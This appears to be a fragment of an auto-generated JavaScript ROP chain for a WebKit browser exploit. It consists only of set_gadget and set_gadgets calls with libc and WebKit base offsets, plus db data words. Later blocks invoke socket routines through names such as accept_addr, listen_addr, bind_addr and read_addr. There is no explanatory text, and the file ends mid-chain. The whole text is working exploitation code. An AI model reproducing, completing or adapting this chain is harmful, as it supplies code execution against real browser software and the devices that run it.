set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+759626,
libc_base+793877
]);

db([4294967240, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+205456,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+205472,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+205624,
webkit_base+7438103,
libc_base+793877,
ropchain+205656,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+205608,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+205640,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+205728,
webkit_base+7438103,
libc_base+793877,
ropchain+205744,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+205840,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+205824,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+205920,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+206072,
webkit_base+7438103,
libc_base+793877,
ropchain+206088,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+206056,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+14959219,
webkit_base+8824269,
libc_base+269973,
libc_base+793877,
ropchain+206256,
webkit_base+7438103,
libc_base+793877,
ropchain+206272,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+206240,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+206376,
webkit_base+7438103,
libc_base+793877,
ropchain+206424,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+206392,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+269973,
webkit_base+414627,
libc_base+793877,
ropchain+206536,
libc_base+547636,
libc_base+186490,
libc_base+793877,
ropchain+206528,
webkit_base+7438103,
webkit_base+1786005,
libc_base+811575
]);

db([0, 0]);
set_gadgets([
ropchain+206552,
ropchain+206568,
libc_base+811575,
ropchain+209104,

libc_base+793877,
ropchain+206608,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967248, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+206712,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+206728,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+206872,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+206840,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+206856,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+206944,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+207000,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+207080,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967240, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+207184,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+207200,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+207352,
webkit_base+7438103,
libc_base+793877,
ropchain+207384,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+207336,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+207368,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+207504,
webkit_base+7438103,
libc_base+793877,
ropchain+207520,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+207488,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+207608,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+207664,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+207736,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967248, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+2997875,
libc_base+759626,
libc_base+793877
]);

db([4294967244, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+207880,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+207896,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+208048,
webkit_base+7438103,
libc_base+793877,
ropchain+208080,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+208032,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+208064,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+208176,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+208160,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+208256,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967240, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+208360,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+208376,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+208528,
webkit_base+7438103,
libc_base+793877,
ropchain+208560,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+208512,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+208544,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+208680,
webkit_base+7438103,
libc_base+793877,
ropchain+208696,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+208664,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+208848,
webkit_base+7438103,
libc_base+793877,
ropchain+208864,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+208832,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+208984,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+208968,
webkit_base+7438103,
libc_base+759626,
libc_base+793877
]);

db([4294967244, 4294967295]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+547636,
webkit_base+954100,
libc_base+793877,
ropchain+209048,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+811575,
ropchain+209088,

libc_base+811575,
ropchain+209104,

libc_base+811575,
ropchain+203096,


libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+172304,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+759626,
libc_base+793877,
ropchain+209304,
webkit_base+7438103,
libc_base+793877
]);

db([4294965192, 4294967295]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+209416,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+147648,

libc_base+882884,
libc_base+793877
]);
db([4294967264, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+209488,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+209592,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+209608,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+209752,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+209720,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+209736,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575,

ropchain+209856,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+811575,
ropchain+218608,

libc_base+882884,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+209928,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+210080,
webkit_base+7438103,
libc_base+793877,
ropchain+210096,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+210064,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+210192,
webkit_base+7438103,
libc_base+793877,
ropchain+210208,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+210320,
webkit_base+7438103,
libc_base+793877,
ropchain+210304,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);
set_gadgets([
libc_base+793877,
ropchain+210408,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+210392,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+210504,
webkit_base+7438103,
libc_base+793877,
ropchain+210520,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+210632,
webkit_base+7438103,
libc_base+793877,
ropchain+210616,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
accept_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+211960,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
listen_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+213288,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
bind_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+214616,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+105267,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+10235455,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+785193,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+11,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
webkit_base+7438103,
libc_base+471355,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+792472,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+248252,
libc_base+788575,
webkit_base+432898,
libc_base+471355,
libc_base+248252,
libc_base+788575,
libc_base+811575,
libc_base+471355,
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967080, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([200, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967088, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([192, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967096, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([184, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967104, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([176, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967112, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+191168,
libc_base+793877
]);
db([168, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967272, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+792472
]);
db([4294967280, 4294967295]);
set_gadgets([
webkit_base+5202439,
libc_base+792472,
read_addr,
webkit_base+2997875,
libc_base+793877
]);
db([4294967192, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([48, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+759626,
libc_base+471355,
libc_base+793877
]);
db([32, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877
]);
db([24, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877
]);
db([128, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+215944,
webkit_base+7438103,
libc_base+811575
]);

db([0, 0]);

set_gadget(libc_base+793877,);
db([208, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+206806,
libc_base+471355,
libc_base+793877
]);
db([4294967280, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,
libc_base+793877,
libc_base+471355,
libc_base+248252,
